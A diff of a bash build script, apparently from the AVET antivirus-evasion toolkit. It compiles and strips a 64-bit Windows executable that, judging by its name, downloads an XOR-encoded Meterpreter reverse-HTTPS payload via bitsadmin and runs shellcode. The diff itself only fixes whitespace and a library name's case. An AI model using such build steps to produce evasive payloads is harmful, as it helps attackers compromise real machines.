@@ -1,4 +1,4 @@
-#!/bin/bash 
+#!/bin/bash
 
 
 #DESCRIPTION_START
@@ -53,7 +53,7 @@ set_payload_execution_method exec_shellcode64
 enable_debug_print to_file C:/users/public/avetdbg.txt
 
 # compile
-$win64_compiler -o output/downloadbitsadmin_mtrprtrxor_revhttps_win64.exe source/avet.c -lwsock32 -lWs2_32
+$win64_compiler -o output/downloadbitsadmin_mtrprtrxor_revhttps_win64.exe source/avet.c -lwsock32 -lws2_32
 strip output/downloadbitsadmin_mtrprtrxor_revhttps_win64.exe
 
 # cleanup
